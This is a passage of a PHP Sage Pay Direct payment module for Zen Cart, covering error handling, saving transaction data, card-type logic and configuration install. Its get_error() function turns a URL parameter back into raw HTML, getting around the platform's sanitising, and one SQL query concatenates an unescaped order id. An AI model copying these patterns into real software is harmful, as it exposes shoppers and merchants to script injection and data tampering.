				$payment_error_return = 'payment_error=' . $this->code . '&error=' .
					urlencode(sprintf($error_message,
						$this->_sage_pay_return_values['StatusDetail']));
				zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL',
					true, false));
			}
		}
	}
	
	// }}}
	
	
	function after_process()
	{
		return false;
	}
	
	
	// {{{ after_order_create()

	/**
	 * Saves the information returned by Sage Pay for this transaction
	 *
	 * @access  public
	 * @param   int     $zf_order_id   The order id associated with this completed transaction.
	 * @return  none
	 */
	function after_order_create($zf_order_id)
	{
		global $db;
		
		// Save response from Sage Pay in the database
		$sage_pay_direct_response_array = array(
			'vpstxid' => $this->_sage_pay_return_values['VPSTxId'],
			'zen_order_id' => $zf_order_id,
			'vendor_tx_code' => $_SESSION['sage_pay_direct_unique_transaction_id'],
			'status' => $this->_sage_pay_return_values['Status'],
			'status_detail' => (strlen($this->_sage_pay_return_values['StatusDetail']) > 0 ? $this->_sage_pay_return_values['StatusDetail'] : ''),
			'security_key' => (isset($this->_sage_pay_return_values['SecurityKey']) ? $this->_sage_pay_return_values['SecurityKey'] : ''),
			'tx_auth_no' => (isset($this->_sage_pay_return_values['TxAuthNo']) ? $this->_sage_pay_return_values['TxAuthNo'] : ''),
			'avs_cv2' => (isset($this->_sage_pay_return_values['AVSCV2']) ? $this->_sage_pay_return_values['AVSCV2'] : ''),
			'address_result' => (isset($this->_sage_pay_return_values['AddressResult']) ? $this->_sage_pay_return_values['AddressResult'] : ''),
			'postcode_result' => (isset($this->_sage_pay_return_values['PostCodeResult']) ? $this->_sage_pay_return_values['PostCodeResult'] : ''),
			'cv2_result' => (isset($this->_sage_pay_return_values['CV2Result']) ? $this->_sage_pay_return_values['CV2Result'] : ''),
			'threed_secure_status' => (isset($this->_sage_pay_return_values['3DSecureStatus']) ? $this->_sage_pay_return_values['3DSecureStatus'] : null),
			'cavv_result' => (isset($this->_sage_pay_return_values['CAVV']) ? $this->_sage_pay_return_values['CAVV'] : null)
			);
		
		zen_db_perform(TABLE_SAGE_PAY_DIRECT, $sage_pay_direct_response_array);
		
		unset($_SESSION['sage_pay_direct_unique_transaction_id']);
	}
	
	// }}}
	
	
	// {{{ admin_notification()

	/**
	 * Displays the saved Sage Pay transaction information in the order details screen in the Admin
	 *
	 * @access  public
	 * @param   int     $zf_order_id  The id of the order for which details should be generated
	 * @return  string  A HTML table detailing the transaction information returned by Sage Pay
	 */
	function admin_notification($zf_order_id)
	{
		global $db;
		
		$sql = "
			SELECT
				*
			FROM
				" . TABLE_SAGE_PAY_DIRECT . "
			WHERE
				zen_order_id = '" . $zf_order_id . "'";
		
		$sage_pay_direct_transaction_info = $db->Execute($sql);
		
		require(DIR_FS_CATALOG. DIR_WS_MODULES .
			'payment/sage_pay_direct/sage_pay_direct_admin_notification.php');
		
		return $output;
	}
	
	// }}}
	
	
	// {{{ _identifyErrorMessage()
	
	/**
	 * Identifies the error message to be displayed according to the Status or StatusDetail
	 * information returned by Sage Pay.
	 *
	 * @access  protected
	 * @param   string  $status         The Status code returned by Sage Pay for the transaction.
	 * @param   string  $status_detail  The Status Details information returned by Sage Pay for the
	 *                                  transaction.
	 * @return  string  The error message for the transaction.
	 */
	function _identifyErrorMessage($status, $status_detail)
	{
		$error_message = null;
		
		// Attempt to identify very specific error messages first using specific status codes
		$specific_code = substr($status_detail, 0, 4);
		
		$status_detail = strtolower($status_detail);
		
		if (is_numeric($specific_code)) {
			$specific_code = (int) $specific_code;
			
			switch ($specific_code) {
				case 3048:
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_NUMBER_ERROR;
					break;
				case 4022:
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_TYPE_DOES_NOT_MATCH;
					break;
				case 4026:
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_3D_SECURE_REJECTED_MESSAGE;
					break;
				case 4027:
					$error_message =
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_3D_SECURE_NOTAUTHED_MESSAGE;
					break;
				case 4046:
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_3D_SECURE_DECLINED_MESSAGE;
					break;
				case 5015:
					if (strpos($status_detail, 'card has expired') !== false) {
						$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_EXPIRED_ERROR;
					} else if (strpos($status_detail, 'issue number length') !== false) {
						$error_message =
							MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_ISSUE_NUMBER_LENGTH_ERROR;
					} else if (strpos($status_detail, 'card range not supported') !== false) {
						$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_UNKNOWN_ERROR;
					} else if (strpos($status_detail, 'cardholder value') !== false) {
						$error_message =
							MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_HOLDER_LENGTH_ERROR;
					} else if (strpos($status_detail, 'check digit invalid') !== false) {
						$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_NUMBER_ERROR;
					} else if (strpos($status_detail, 'security code') !== false) {
						$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CVV_NUMBER_ERROR;
					} else if (strpos($status_detail, 'startdate') !== false) {
						$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_START_ERROR;
					}
					break;
			}
		}
		
		if (is_null($error_message)) {
			// Couldn't identify specific error message, attempt to match more general status codes
			switch ($status) {
				case 'MALFORMED':
					// Handle special case of card type not matching number - shouldn't report this
					// to the customer as malformed just because bin code  verification is
					// unreliable and therefore not used by this module!
					if (strpos($status_detail, 'card type does not match') !== false) {
						$error_message =
							MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_TYPE_DOES_NOT_MATCH;	
						break;
					}
				case 'INVALID':
					// Supposedly mean to that the module is not functioning properly or has not 
					// been configured properly (vendor name missing, wrong currency), but seems
					// to apply to card details being missing (e.g. Issue No.)
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_INVALID_MESSAGE;
					break;
				case 'NOTAUTHED':
					// Card authorisation has failed completely, ask the customer to enter details
					// for another card
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_NOTAUTHED_MESSAGE;
					break;
				case 'REJECTED':
					// Details haven't complied with the rules set up in the VSP admin
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_REJECTED_MESSAGE;
					break;
				case 'ERROR':
					// Serious Sage Pay error occurred. No chance of progressing at the minute!
					// Includes vendor name not being supplied or unsupported currency
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_ERROR_MESSAGE;
					break;
				default:
					// The response code is not OK (approved), some sort of error occurred
					$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DECLINED_MESSAGE;
			}
		}
		
		return $error_message;
	}
	
	// }}}
	
	
	// {{{ _encodeErrorMessage()

	/**
	 * Encodes tags in an error message by using ceonltceon instead of <, ceongtceon instead of >
	 * and ceonquotceon instead of ".
	 * 
	 * Rationale: Unfortunately Zen Cart, rather unintuitively, sanitizes all GET variables
	 * regardless of their content and therefore precludes the passing of HTML tags in error
	 * messages.
	 *
	 * @access  protected
	 * @param   string  $message  The message to be encoded.
	 * @return  string            The encoded message.
	 */
	function _encodeErrorMessage($message)
	{
		$message = str_replace('<', 'ceonltceon', $message);
		$message = str_replace('>', 'ceongtceon', $message);
		
		$message = str_replace('"', 'ceonquotceon', $message);
		
		return $message;
	}
	
	// }}}
	
	
	// {{{ get_error()

	/**
	 * Gets the current error message from the URL and returns it for addition to the Message Stack.
	 *
	 * @access  public
	 * @param   none
	 * @return  array  The title and message parts of the error message are returned in a hash.
	 */
	function get_error()
	{
		// Translate Coded Version of HTML error message back into HTML
		// Necessary to get round Zen Cart's interference (sanitisation) of GET Variables.
		$error_message = stripslashes(urldecode($_GET['error']));
		$error_message = str_replace('ceonltceon', '<', $error_message);
		$error_message = str_replace('ceongtceon', '>', $error_message);
		$error_message = str_replace('ceonquotceon', '"', $error_message);
		
		$error = array(
			'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_ERROR,
			'error' => $error_message
			);
		
		return $error;
	}
	
	// }}}


	// {{{ _showStartDate()

	/**
	 * Examines the list of cards accepted and determines whether at least one of them may need a
	 * start date to be supplied for card processing to take place.
	 *
	 * @access  private
	 * @param   none
	 * @return  bool  Whether at least one of the cards accepted may need a start date to be
	 *                supplied for card processing to take place (boolean true for yes!)
	 */
	function _showStartDate()
	{
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_SOLO == 'Yes') {
			return true;
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MAESTRO == 'Yes') {
			return true;
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_AMEX == 'Yes') {
			return true;
		}
		
		return false;
	}
	
	// }}}
	
	
	// {{{ _cardTypeUsesStartDate()

	/**
	 * Checks if the specified card type may have/need a start date to be supplied for card
	 * processing to take place.
	 *
	 * @access  private
	 * @param   string   $card_type   The type of the card to be checked.
	 * @return  bool  Whether the card may need a start date to be supplied for card processing to
	 *                take place (boolean true for yes!)
	 */
	function _cardTypeUsesStartDate($card_type)
	{
		if ($card_type == 'SOLO' || $card_type == 'MAESTRO' || $card_type == 'AMEX') {
			return true;
		}
		
		return false;
	}
	
	// }}}
	
	
	// {{{ _showIssueNumber()

	/**
	 * Examines the list of cards accepted and determines whether at least one of them may need an
	 * issue number to be supplied for card processing to take place.
	 *
	 * @access  private
	 * @param   none
	 * @return  bool  Whether at least one of the cards accepted may need an issue number to be
	 *                supplied for card processing to take place (boolean true for yes!)
	 */
	function _showIssueNumber()
	{
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_SOLO == 'Yes') {
			return true;
		}
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MAESTRO == 'Yes') {
			return true;
		}
		
		return false;
	}
	
	// }}}
	
	
	// {{{ _cardTypeUsesIssueNumber()

	/**
	 * Checks if the specified card type may have/need an issue number to be supplied for card
	 * processing to take place.
	 *
	 * @access  private
	 * @param   string   $card_type   The type of the card to be checked.
	 * @return  bool  Whether the card may need an issue number to be supplied for card processing 
	 *                to take place (boolean true for yes!)
	 */
	function _cardTypeUsesIssueNumber($card_type)
	{
		if ($card_type == 'SOLO' || $card_type == 'MAESTRO') {
			return true;
		}
		
		return false;
	}
	
	// }}}
	
	
	// {{{ _getCardTypeNameForCode()

	/**
	 * Returns the Name of the Card Type for the given Card Type Code. If a surcharge or discount
	 * has been defined for the card type which matches the order, details or the surcharge/discount
	 * are appended to the name. This surcharge/discount is then applied by the
	 * ot_payment_surcharges_discounts Order Total module.
	 *
	 * @access  private
	 * @param   string  $card_type_code                The code of the card Type for which the Name 
	 *                                                 should be returned.
	 * @param   boolean $add_surcharge_discount_info   Whether or not to add details about
	 *                                                 surcharge/discount after the name.
	 * @return  string  The Name of the Card Type (inc possibly any surcharge/discount information).
	 */
	function _getCardTypeNameForCode($card_type_code, $add_surcharge_discount_info = true)
	{
		global $order, $currencies;
		
		$card_type_name = '';
		
		switch ($card_type_code) {
			case 'VISA':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_VISA;
				break;
			case 'MC':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_MC;
				break;
			case 'DELTA':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_VISA_DEBIT;
				break;
			case 'SOLO':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_SOLO;
				break;
			case 'MAESTRO':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_MAESTRO;
				break;
			case 'UKE':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_VISA_ELECTRON;
				break;
			case 'AMEX':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_AMEX;
				break;
			case 'DC':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DC;
				break;
			case 'JCB':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JCB;
				break;
			case 'LASER':
				$card_type_name = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_LASER;
				break;
			default:
				break;
		}
		
		// Check if the Surcharges/Discounts Order Total module is in use and if so, whether any
		// surcharges/discounts have been specified for the specified card type and should be
		// appended to the card type's name
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS == 'Yes'
				&& isset($GLOBALS['ot_payment_surcharges_discounts'])
				&& $add_surcharge_discount_info) {
			
			// Check if there are any surcharges/discounts defined for the specified card type
			$table_of_rates = $this->_getSurchargeDiscountTableOfRates($card_type_code);
			
			if ($table_of_rates !== false) {
				// Check if any rate applies to the current order
				$surcharge_or_discount =
					$GLOBALS['ot_payment_surcharges_discounts']->getSurchargeOrDiscount($table_of_rates);
				
				if (!is_numeric($surcharge_or_discount)) {
					// There was a problem determining the rate
					// Alert the customer to the error
					$card_type_name .= ' (' . $surcharge_or_discount . ')';
				} else if ($surcharge_or_discount !== false && $surcharge_or_discount != 0) {
					// A surcharge or discount applies to this card type and order value. Check if
					// some informational text has been defined in the language file
					$surcharge_discount_short_text = trim(constant(
						'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_' . $card_type_code .
						'_SHORT_' . $_SESSION['languages_id']));
					if (strlen($surcharge_discount_short_text) > 0) {
						$surcharge_or_discount_text = $surcharge_discount_short_text;
					} else {
						// Use default text to inform the customer about the surcharge/discount
						if ($surcharge_or_discount < 0) {
							$surcharge_or_discount_text =
								MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DISCOUNT_SHORT;
						} else {
							$surcharge_or_discount_text =
								MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_SURCHARGE_SHORT;
						}
					}
					
					$surcharge_or_discount_display_value =
						$currencies->format($surcharge_or_discount, true, $order->info['currency'],
						$order->info['currency_value']);
					
					// Alert the customer to the amount
					$card_type_name .= ' (' . $surcharge_or_discount_text . ': ' .
						$surcharge_or_discount_display_value . ')';
				}
			}
		}
		
		return $card_type_name;
	}
	
	// }}}
	
	
	// {{{ _getSurchargeDiscountTableOfRates()

	/**
	 * Checks if a surcharge/discount table of rates has been defined for the specified card type.
	 *
	 * @access  private
	 * @param   string  $card_type_code   The code of the card Type for which the surcharge/discount
	 *                                    table of rates should be returned.
	 * @return  string  The surcharge/discount table of rates for the specified card type.
	 */
	function _getSurchargeDiscountTableOfRates($card_type_code)
	{
		$surcharges_discounts = ereg_replace('[[:space:]]+', '', constant(
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_' . $card_type_code));
		if (!is_null($surcharges_discounts) && strlen($surcharges_discounts) > 0) {
			return $surcharges_discounts;
		}
		
		return false;
	}
	
	// }}}
	
	
	// {{{ _getUSStateCode()

	/**
	 * Looks up the two letter code for a US state.
	 *
	 * @access  private
	 * @param   integer  $zone_id   The ID of the zone for the US state.
	 * @param   string   $state     The name of the state.
	 * @return  string|false     The two letter code for the US state or false if it couldn't be
	 *                           identified.
	 */
	function _getUSStateCode($zone_id, $state)
	{
		global $db;
		
		$us_state_code = false;
		
		if (!is_null($zone_id) && $zone_id > 0 && 4==7) {
			// Look up the two letter code for the state based on its zone_id
			$us_state_code_query = "
				SELECT
					zone_code
				FROM
					 " . TABLE_ZONES . "
				WHERE
					zone_id = '" . (int) $zone_id . "';";
					
			$us_state_code_result = $db->Execute($us_state_code_query);
			
			if (!$us_state_code_result->EOF) {
				$us_state_code = $us_state_code_result->fields['zone_code'];
			}
		} else {
			// Look up the two letter code for the state based on its name
			$us_state_codes = array(
				'Alabama' => 'AL',
				'Alaska' => 'AK',
				'American Samoa' => 'AS',
				'Arizona' => 'AZ',
				'Arkansas' => 'AR',
				'Armed Forces Africa' => 'AF',
				'Armed Forces Americas' => 'AA',
				'Armed Forces Canada' => 'AC',
				'Armed Forces Europe' => 'AE',
				'Armed Forces Middle East' => 'AM',
				'Armed Forces Pacific' => 'AP',
				'California' => 'CA',
				'Colorado' => 'CO',
				'Connecticut' => 'CT',
				'Delaware' => 'DE',
				'District of Columbia' => 'DC',
				'Federated States Of Micronesia' => 'FM',
				'Florida' => 'FL',
				'Georgia' => 'GA',
				'Guam' => 'GU',
				'Hawaii' => 'HI',
				'Idaho' => 'ID',
				'Illinois' => 'IL',
				'Indiana' => 'IN',
				'Iowa' => 'IA',
				'Kansas' => 'KS',
				'Kentucky' => 'KY',
				'Louisiana' => 'LA',
				'Maine' => 'ME',
				'Marshall Islands' => 'MH',
				'Maryland' => 'MD',
				'Massachusetts' => 'MA',
				'Michigan' => 'MI',
				'Minnesota' => 'MN',
				'Mississippi' => 'MS',
				'Missouri' => 'MO',
				'Montana' => 'MT',
				'Nebraska' => 'NE',
				'Nevada' => 'NV',
				'New Hampshire' => 'NH',
				'New Jersey' => 'NJ',
				'New Mexico' => 'NM',
				'New York' => 'NY',
				'North Carolina' => 'NC',
				'North Dakota' => 'ND',
				'Northern Mariana Islands' => 'MP',
				'Ohio' => 'OH',
				'Oklahoma' => 'OK',
				'Oregon' => 'OR',
				'Pennsylvania' => 'PA',
				'Puerto Rico' => 'PR',
				'Rhode Island' => 'RI',
				'South Carolina' => 'SC',
				'South Dakota' => 'SD',
				'Tennessee' => 'TN',
				'Texas' => 'TX',
				'Utah' => 'UT',
				'Vermont' => 'VT',
				'Virgin Islands' => 'VI',
				'Virginia' => 'VA',
				'Washington' => 'WA',
				'West Virginia' => 'WV',
				'Wisconsin' => 'WI',
				'Wyoming' => 'WY'
				);
			
			// Clean up the state's text to maximise possibility of match
			$state = preg_replace('|[\s]+|', ' ', $state);
			$state = trim($state);
			
			if (strlen($state) == 2) {
				return strtoupper($state);
			}
			
			$state = ucwords(strtolower($state));
			
			if (isset($us_state_codes[$state])) {
				$us_state_code = $us_state_codes[$state];
			}
		}
		
		return $us_state_code;
	}
	
	// }}}
	
	
	// {{{ _cleanString()

	/**
	 * Simple function designed to strip non-standard characters from a string, as required by Sage Pay
	 * for certain values.
	 *
	 * @access  private
	 * @param   string  $strRawText  The text to be "cleaned".
	 * @param   string  $strRawText  The type of the text.
	 * @return  string     The "cleaned" text.
	 */
	function _cleanString($strRawText, $strType = 'default')
	{
		if ($strType == 'Number') {
			$strClean = '0123456789.';
			$bolHighOrder = false;
		} else if ($strType == 'VendorTxCode') {
			$strClean = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.{}';
			$bolHighOrder = false;
		} else if ($strType == 'CustomerName') {
			$strClean= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-.\'';
			$bolHighOrder = true;
		} else if ($strType == 'Address') {
			$strClean= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-.\',/';
			$bolHighOrder = true;
		} else if ($strType == 'City') {
			$strClean= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-.\'';
			$bolHighOrder = true;
		} else if ($strType == 'Postcode') {
			$strClean= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-';
			$bolHighOrder = true;
		} else if ($strType == 'Telephone') {
			$strClean= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-()+';
			$bolHighOrder = false;
		} else {
			$strClean= ' ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.,\'/{}@():?-_&£$=%~<>*+"';
			$bolHighOrder = true;
		}
		
		$strCleanedText = "";
		$iCharPos = 0;
		
		do {
			// Only include valid characters
			$chrThisChar = substr($strRawText, $iCharPos, 1);
			
			if (strspn($chrThisChar, $strClean, 0, strlen($strClean)) > 0) { 
				$strCleanedText = $strCleanedText . $chrThisChar;
			} else if ($bolHighOrder == true) {
				// Fix to allow accented characters and most high order bit chars which are harmless 
				if (bin2hex($chrThisChar) >= 191) {
					$strCleanedText = $strCleanedText . $chrThisChar;
				}
			}
			
			$iCharPos = $iCharPos+1;
			
		} while ($iCharPos < strlen($strRawText));
		
		$cleanInput = ltrim($strCleanedText);
		
		return $cleanInput;
	}
	
	// }}}
	
	
	// {{{ _parseSagePayResponse()

	/**
	 * Parses a response string into its name/value pairs.
	 *
	 * @access  private
	 * @param   string  $sage_pay_response   The response string returned by Sage Pay.
	 * @return  array   The parsed key/value pairs from Sage Pay.
	 */
	function _parseSagePayResponse($sage_pay_response)
	{
		$parsed_response = array();
		
		$sage_pay_response = explode("\n", $sage_pay_response);
		
		for ($i = 0 ; $i < sizeof($sage_pay_response); $i++)
		{
			$sage_pay_response[$i] = trim($sage_pay_response[$i]);
			
			// Split the current return value into its name and data
			// (Example format: Status=OK )
			// Data can have equals signs so only take first equals sign as the delimiter
			$delimiter_pos = strpos($sage_pay_response[$i], '=');
			
			if ($delimiter_pos !== false) {
				$key = substr($sage_pay_response[$i], 0, $delimiter_pos);
				$value = substr($sage_pay_response[$i], $delimiter_pos + 1,
					strlen($sage_pay_response[$i]) - $delimiter_pos - 1);
				
				$parsed_response[$key] = $value;
			}
		}
		
		return $parsed_response;
	}
	
	// }}}
	
	
	function check()
	{
		global $db;
		
		if (!isset($this->_check)) {
			$check_query = $db->Execute("select configuration_value from " . TABLE_CONFIGURATION .
				" where configuration_key = 'MODULE_PAYMENT_SAGE_PAY_DIRECT_STATUS'");
			$this->_check = $check_query->RecordCount();
		}
		return $this->_check;
	}
	
	function install()
	{
		global $db;
		
		$languages = zen_get_languages();
		
		// General configuration values ////////////////////////////////////////////////////////////
		$background_colour = '#d0d0d0';
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><fieldset style=\"background: " . $background_colour . "; margin-bottom: 1.5em;\"><legend style=\"font-size: 1.4em; font-weight: bold\">General Config</legend><b>Enable Sage Pay Direct Module', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_STATUS', 'Yes', 'Should Sage Pay Direct be enabled as a payment option for this site?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Vendor Name', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_VENDOR_NAME', 'testvendor', 'The Vendor Name to be used for the Sage Pay service.', '6', '0', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Merchant Account Accepted Currency/Currencies', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPTED_CURRENCIES', 'GBP', 'A comma-separated list of the currencies of the Merchant Accounts associated with the Sage Pay Go account being used. E.g. If the Sage Pay Go account is associated with two merchant accounts, one for Pounds Sterling and one for Euros, the currency codes \'GBP,EUR\' should be entered. If there is only one merchant account associated with the Sage Pay Go account being used, its currency code should be entered, e.g. \'GBP\'.', '6', '0', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Default Merchant Account\'s Currency', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY', 'GBP', 'The Currency Code for the currency of the Default Merchant Account. E.g. \'GBP\'.', '6', '0', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Transaction Mode', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE', 'Test', 'Transaction mode used for processing orders.', '6', '0', 'zen_cfg_select_option(array(\'Live\', \'Test\', \'Simulator\', \'IP Address Check\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Authorisation Type', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_AUTHORISATION_TYPE', 'Immediate Charge', 'Should submitted card transactions be authenticated, deferred, or immediately charged? (Consult Sage Pay documentation for an explanation).', '6', '0', 'zen_cfg_select_option(array(\'Authenticate\', \'Deferred\', \'Immediate Charge\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Enable Surcharge/Discount Functionality', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS', 'Yes', 'If enabled, this option will allow a Single Rate or a Table of Rates to be specified for any of the enabled card types, to be used in conjunction with the ot_payment_surcharges_discounts Order Total module, to apply either a surcharge or discount for a card type, dependant on the value of the order.<br /><br />The Rates can be either Specific Values (E.g. 2.00 or -3.50) or Percentages (E.g. 4% or -0.5%) or, <strong>for surcharges only</strong>, a Percentage plus a Specific Value (E.g. 3.4%+0.20).<br /><br /><em>For example</em>: A Single Rate which applies to all Order Values could be specified as &ldquo;2.5%&rdquo; or &ldquo;1.50&rdquo; (without the quotes).<br /><br />The Tables of Rates are comma-separated lists of Limits/Rate pairs. Each Limits/Rate pair consists of an Order Value Range and a Rate, separated by a colon. <br /><br /><em>For example</em>: 1000:2.00,3000:1.50,*:0 <br /><br />In the above example, orders with a Total Value less than 1000 would have a surcharge of 2.00, those from 1000 up to 3000 would have a surcharge of 1.50 and orders of 3000 and above would have no surcharge applied).<br /><br />Notes: An asterix (*) is a wildcard which matches any value, Lower Limits for ranges can be specified by preceding the Upper Limit with a dash (E.g. 300-500).<br /><br />Should Surcharges/Discounts be enabled?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Send Cart Contents to Sage Pay', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOPCART', 'Yes', 'Send details of shopping cart\'s contents to Sage Pay?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Add Model Number after Product\'s Name', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOPCART_ADD_MODEL_NUM', 'Yes', 'Should the model number be added after each product\'s name in the shopping cart details sent to Sage Pay?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, use_function, set_function, date_added) values ('Payment Zone', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ZONE', '0', 'If a zone is selected, this module will only be enabled for the selected zone.<br /><br />Leave set to \"--none--\" if Sage Pay Direct should be used for all customers, regardless of what zone their billing address is in.', '6', '0', 'zen_get_zone_class_title', 'zen_cfg_pull_down_zone_classes(', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, use_function, date_added) values ('Set Order Status', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ORDER_STATUS_ID', '0', 'Orders paid for using this module will have their order status set to this value.', '6', '0', 'zen_cfg_pull_down_order_statuses(', 'zen_get_order_status_name', now())");
		
		
		// Security configuration values ///////////////////////////////////////////////////////////
		$background_colour = '#eee';
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b></fieldset><fieldset style=\"background: " . $background_colour . "; margin-bottom: 1.5em;\"><legend style=\"font-size: 1.4em; font-weight: bold\">Security Options</legend><b>Store entered details temporarily in session?', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION', 'Yes', 'Should the customer\'s card details be temporarily stored in the session? (They\'ll be cleared from the session when the order is completed). <br /><br />When this option is enabled, if a customer makes a mistake when entering their details, the module will restore the details entered so they don\'t have to re-enter them. For security reasons, it is advised that these details are encrypted (which requires the PEAR:Crypt_Blowfish package to be installed <strong>and accessible</strong> on the server).<br /><br />When this option is disabled and a problem is encountered with the card details entered by the customer, none of the details entered will have been stored so they\'ll have to enter all the details again. In this case, details will not be stored in the session, so Blowfish Encryption won\'t be necessary.', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Use Blowfish Encryption?', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH', 'Yes', 'If storing card details temporarily in the session, should Blowfish Encryption be used?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
